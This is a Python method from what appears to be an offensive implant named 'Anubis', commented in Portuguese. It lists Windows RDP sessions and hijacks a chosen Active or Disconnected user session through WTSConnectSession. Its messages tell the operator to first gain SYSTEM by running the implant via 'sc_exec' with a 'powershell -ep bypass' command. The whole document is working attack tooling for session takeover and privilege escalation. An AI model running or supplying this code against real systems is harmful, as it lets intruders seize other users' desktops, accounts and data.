    def rdp_hijack(self, task_id, session_id=0, dest_session=-1):
        if platform.system() != 'Windows':
            return "rdp_hijack: only supported on Windows"

        try:
            import ctypes
            import ctypes.wintypes as W

            wtsapi32 = ctypes.windll.wtsapi32
            kernel32  = ctypes.windll.kernel32

            # ── WTS_SESSION_INFOW ─────────────────────────────────────────────
            class WTS_SESSION_INFOW(ctypes.Structure):
                _fields_ = [
                    ("SessionId",       W.DWORD),
                    ("pWinStationName", ctypes.c_wchar_p),
                    ("State",           W.DWORD),
                ]

            # WTSConnectState enum
            _state = {
                0: "Active", 1: "Connected", 2: "ConnectQuery",
                3: "Shadow", 4: "Disconnected", 5: "Idle",
                6: "Listen", 7: "Reset", 8: "Down", 9: "Init",
            }

            # WTS_INFO_CLASS valores relevantes
            WTSUserName   = 5
            WTSDomainName = 7

            WTS_CURRENT_SERVER_HANDLE = None

            # ── helper: lê string de sessão via WTSQuerySessionInformationW ───
            wtsapi32.WTSQuerySessionInformationW.restype  = W.BOOL
            wtsapi32.WTSQuerySessionInformationW.argtypes = [
                W.HANDLE, W.DWORD, W.DWORD,
                ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(W.DWORD),
            ]

            def _wts_str(sid, info_class):
                pBuf   = ctypes.c_void_p(None)
                pBytes = W.DWORD(0)
                ok = wtsapi32.WTSQuerySessionInformationW(
                    WTS_CURRENT_SERVER_HANDLE, sid, info_class,
                    ctypes.byref(pBuf), ctypes.byref(pBytes)
                )
                if not ok or not pBuf.value:
                    return ""
                val = ctypes.wstring_at(pBuf.value)
                wtsapi32.WTSFreeMemory(pBuf)
                return val

            # ── enumera sessões ───────────────────────────────────────────────
            wtsapi32.WTSEnumerateSessionsW.restype  = W.BOOL
            wtsapi32.WTSEnumerateSessionsW.argtypes = [
                W.HANDLE, W.DWORD, W.DWORD,
                ctypes.POINTER(ctypes.POINTER(WTS_SESSION_INFOW)),
                ctypes.POINTER(W.DWORD),
            ]

            pp_info = ctypes.POINTER(WTS_SESSION_INFOW)()
            p_count = W.DWORD(0)

            if not wtsapi32.WTSEnumerateSessionsW(
                WTS_CURRENT_SERVER_HANDLE, 0, 1,
                ctypes.byref(pp_info), ctypes.byref(p_count)
            ):
                return "rdp_hijack: WTSEnumerateSessionsW failed (error {})".format(
                    kernel32.GetLastError())

            sessions = []
            for i in range(p_count.value):
                s     = pp_info[i]
                sid   = int(s.SessionId)
                state = _state.get(s.State, "Unknown({})".format(s.State))
                name  = s.pWinStationName or ""
                user  = _wts_str(sid, WTSUserName)
                dom   = _wts_str(sid, WTSDomainName)
                display_user = "{}\\{}".format(dom, user) if dom and user else user
                sessions.append((sid, name, state, display_user, s.State))

            wtsapi32.WTSFreeMemory(pp_info)

            # ── modo LIST (session_id == 0) ───────────────────────────────────
            if int(session_id) == 0:
                lines = ["{:<5} {:<22} {:<14} {}".format("ID", "Station", "State", "User")]
                lines.append("-" * 65)
                for sid, name, state, user, raw_state in sessions:
                    marker = " ◄" if raw_state in (0, 4) else ""  # Active/Disconnected
                    lines.append("{:<5} {:<22} {:<14} {}{}".format(
                        sid, name, state, user, marker))
                lines.append(
                    "\n[*] ◄ = sessões alvejáveis (Active/Disconnected)\n"
                    "[!] Requer SYSTEM — rode via sc_exec primeiro se necessário:\n"
                    "    sc_exec <host> \"powershell -ep bypass -f C:\\Temp\\a.ps1\"\n"
                    "[*] Para hijack: rdp_hijack <session_id>"
                )
                return "\n".join(lines)

            # ── modo HIJACK ───────────────────────────────────────────────────
            target_sid = int(session_id)

            # Session destino: fornecida ou auto-detectada (sessão do processo atual)
            if dest_session < 0:
                my_pid  = kernel32.GetCurrentProcessId()
                my_sid  = W.DWORD(0)
                kernel32.ProcessIdToSessionId(my_pid, ctypes.byref(my_sid))
                dest_sid = my_sid.value
            else:
                dest_sid = int(dest_session)

            # Valida que a sessão alvo existe
            found = next((s for s in sessions if s[0] == target_sid), None)
            if not found:
                return "rdp_hijack: sessão {} não encontrada nos hosts locais.\n" \
                       "Use rdp_hijack 0 para listar sessões disponíveis.".format(target_sid)

            _, t_name, t_state, t_user, _ = found

            # ── WTSConnectSession (wtsapi32) ──────────────────────────────────
            # WTSConnectSession(LogonId=target, TargetLogonId=dest, Password, Wait)
            # Requer SYSTEM — se falhar com 5 (Access Denied), escale primeiro via sc_exec
            wtsapi32.WTSConnectSession.restype  = W.BOOL
            wtsapi32.WTSConnectSession.argtypes = [
                W.ULONG, W.ULONG, ctypes.c_wchar_p, W.BOOL
            ]

            ok = wtsapi32.WTSConnectSession(target_sid, dest_sid, "", True)

            if ok:
                return (
                    "[+] rdp_hijack success\n"
                    "    Session hijacked : {} ({}, {})\n"
                    "    User             : {}\n"
                    "    Destination      : session {}\n\n"
                    "[*] Desktop da sessão {} agora está ativo na sessão {}"
                ).format(target_sid, t_name, t_state, t_user,
                         dest_sid, target_sid, dest_sid)
            else:
                err = kernel32.GetLastError()
                hint = ""
                if err == 5:
                    hint = ("\n[!] Access Denied (5) — requer SYSTEM.\n"
                            "    Deploy Anubis como SYSTEM via sc_exec primeiro, "
                            "então execute rdp_hijack.")
                elif err == 7022:
                    hint = "\n[!] Sessão em uso ou sem permissão de conectar."
                return "[-] rdp_hijack: WTSConnectSession falhou (error {}){}".format(
                    err, hint)

        except Exception as e:
            return "rdp_hijack error: {}".format(e)
